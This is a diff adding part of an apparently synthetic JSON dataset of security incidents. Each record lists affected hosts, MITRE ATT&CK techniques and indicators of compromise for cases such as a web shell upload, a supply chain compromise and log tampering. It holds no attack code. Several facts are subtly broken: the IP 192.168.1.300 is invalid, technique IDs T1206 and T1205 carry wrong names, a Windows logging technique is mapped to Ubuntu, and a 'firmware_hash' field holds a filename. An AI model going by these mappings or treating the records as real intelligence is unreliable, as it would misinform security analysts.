+                    {"name": "AWS S3", "version": "N/A"},
+                    {"name": "Cloud Storage", "version": "N/A"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1530",
+                "name": "Data from Cloud Storage",
+                "description": "Cloud storage misconfiguration"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "s3_bucket",
+                "value": "s3://sensitive-data-bucket",
+                "description": "Misconfigured S3 bucket"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-14-020",
+        "title": "Network Segmentation Bypass",
+        "description": "Attempted bypass of network segmentation controls.",
+        "initial_findings": "Unauthorized network access between segmented zones.",
+        "timestamp": "2024-07-14T15:55:23Z",
+        "affected_assets": [
+            {
+                "hostname": "NETWORK-SWITCH-01",
+                "ip_address": "10.0.0.80",
+                "os": "Cisco IOS",
+                "installed_software": [
+                    {"name": "Network OS", "version": "15.2"},
+                    {"name": "Security Features", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1599",
+                "name": "Network Boundary Bridging",
+                "description": "Network segmentation bypass"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "network_traffic",
+                "value": "Unauthorized VLAN hopping",
+                "description": "Network segmentation bypass attempt"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-15-021",
+        "title": "Supply Chain Attack",
+        "description": "Malicious code injected into software supply chain.",
+        "initial_findings": "Compromised software package in dependency repository.",
+        "timestamp": "2024-07-15T10:30:34Z",
+        "affected_assets": [
+            {
+                "hostname": "BUILD-SRV-01",
+                "ip_address": "10.0.0.90",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "npm", "version": "7.20.0"},
+                    {"name": "Python", "version": "3.9.5"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1195",
+                "name": "Supply Chain Compromise",
+                "description": "Software supply chain attack"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "package_name",
+                "value": "malicious-package@1.0.0",
+                "description": "Compromised npm package"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-16-022",
+        "title": "Credential Stuffing Attack",
+        "description": "Automated credential stuffing attack against web application.",
+        "initial_findings": "Multiple failed login attempts from various IP addresses.",
+        "timestamp": "2024-07-16T12:05:45Z",
+        "affected_assets": [
+            {
+                "hostname": "WEB-APP-01",
+                "ip_address": "10.0.0.100",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Nginx", "version": "1.18.0"},
+                    {"name": "Node.js", "version": "14.17.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1110",
+                "name": "Brute Force",
+                "description": "Credential stuffing"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "ip_address",
+                "value": "45.67.89.123",
+                "description": "Attacker IP address"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-17-023",
+        "title": "Memory Corruption Exploit",
+        "description": "Attempted exploitation of memory corruption vulnerability.",
+        "initial_findings": "Suspicious memory access patterns and crash dumps.",
+        "timestamp": "2024-07-17T14:40:56Z",
+        "affected_assets": [
+            {
+                "hostname": "APP-SRV-01",
+                "ip_address": "10.0.0.110",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Custom Application", "version": "2.0"},
+                    {"name": "Memory Manager", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1206",
+                "name": "Exploitation for Client Execution",
+                "description": "Memory corruption exploit"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "memory_address",
+                "value": "0x7fff12345678",
+                "description": "Targeted memory address"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-18-024",
+        "title": "Web Shell Upload",
+        "description": "Malicious web shell uploaded to web server.",
+        "initial_findings": "Suspicious PHP file detected in web root directory.",
+        "timestamp": "2024-07-18T09:15:07Z",
+        "affected_assets": [
+            {
+                "hostname": "WEB-SRV-01",
+                "ip_address": "10.0.0.120",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Apache", "version": "2.4.46"},
+                    {"name": "PHP", "version": "7.4.3"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1505.003",
+                "name": "Server Software Component: Web Shell",
+                "description": "Web shell upload"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "/var/www/html/shell.php",
+                "description": "Malicious web shell"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-19-025",
+        "title": "Network Protocol Attack",
+        "description": "Attempted exploitation of network protocol vulnerability.",
+        "initial_findings": "Malformed network packets and protocol violations.",
+        "timestamp": "2024-07-19T11:50:18Z",
+        "affected_assets": [
+            {
+                "hostname": "NETWORK-SRV-01",
+                "ip_address": "10.0.0.130",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Network Stack", "version": "1.0"},
+                    {"name": "Protocol Handler", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1205",
+                "name": "Exploitation for Defense Evasion",
+                "description": "Network protocol attack"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "network_packet",
+                "value": "Malformed TCP packet",
+                "description": "Protocol violation"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-20-026",
+        "title": "Configuration File Tampering",
+        "description": "Unauthorized modification of system configuration files.",
+        "initial_findings": "Changes to critical configuration files detected.",
+        "timestamp": "2024-07-20T13:25:29Z",
+        "affected_assets": [
+            {
+                "hostname": "CONFIG-SRV-01",
+                "ip_address": "10.0.0.140",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Configuration Manager", "version": "1.0"},
+                    {"name": "File System", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1562.001",
+                "name": "Impair Defenses: Disable or Modify Tools",
+                "description": "Configuration tampering"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "/etc/config/system.conf",
+                "description": "Modified configuration file"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-21-027",
+        "title": "API Endpoint Abuse",
+        "description": "Unauthorized use of API endpoints for data scraping.",
+        "initial_findings": "Abnormal API usage patterns and rate limit violations.",
+        "timestamp": "2024-07-21T15:00:40Z",
+        "affected_assets": [
+            {
+                "hostname": "API-SRV-01",
+                "ip_address": "10.0.0.150",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "API Gateway", "version": "1.0"},
+                    {"name": "Rate Limiter", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1190",
+                "name": "Exploit Public-Facing Application",
+                "description": "API abuse"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "api_endpoint",
+                "value": "/api/v1/data",
+                "description": "Abused API endpoint"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-22-028",
+        "title": "Firmware Modification",
+        "description": "Unauthorized modification of device firmware.",
+        "initial_findings": "Firmware integrity check failures and unexpected behavior.",
+        "timestamp": "2024-07-22T10:35:51Z",
+        "affected_assets": [
+            {
+                "hostname": "DEVICE-01",
+                "ip_address": "192.168.1.300",
+                "os": "Embedded Linux",
+                "installed_software": [
+                    {"name": "Device Firmware", "version": "1.0"},
+                    {"name": "Bootloader", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1542",
+                "name": "Pre-OS Boot",
+                "description": "Firmware modification"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "firmware_hash",
+                "value": "modified_firmware.bin",
+                "description": "Modified firmware file"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-23-029",
+        "title": "Log Tampering",
+        "description": "Attempted modification of system logs to hide malicious activity.",
+        "initial_findings": "Gaps in log files and suspicious log entries.",
+        "timestamp": "2024-07-23T12:10:02Z",
+        "affected_assets": [
+            {
+                "hostname": "LOG-SRV-01",
+                "ip_address": "10.0.0.160",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Log Manager", "version": "1.0"},
+                    {"name": "File System", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1562.002",
+                "name": "Impair Defenses: Disable Windows Event Logging",
+                "description": "Log tampering"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "file_path",
+                "value": "/var/log/system.log",
+                "description": "Tampered log file"
+            }
+        ]
+    },
+    {
+        "incident_id": "INC-2024-07-24-030",
+        "title": "Network Traffic Analysis Evasion",
+        "description": "Attempted evasion of network traffic analysis tools.",
+        "initial_findings": "Encrypted and obfuscated network traffic patterns.",
+        "timestamp": "2024-07-24T14:45:13Z",
+        "affected_assets": [
+            {
+                "hostname": "NETWORK-SRV-01",
+                "ip_address": "10.0.0.170",
+                "os": "Ubuntu 20.04 LTS",
+                "installed_software": [
+                    {"name": "Network Stack", "version": "1.0"},
+                    {"name": "Traffic Analyzer", "version": "1.0"}
+                ]
+            }
+        ],
+        "observed_ttps": [
+            {
+                "id": "T1564",
+                "name": "Hide Artifacts",
+                "description": "Traffic analysis evasion"
+            }
+        ],
+        "indicators_of_compromise": [
+            {
+                "type": "network_traffic",
+                "value": "Encrypted DNS over HTTPS",
+                "description": "Obfuscated network traffic"
+            }
+        ]
+    }
+]
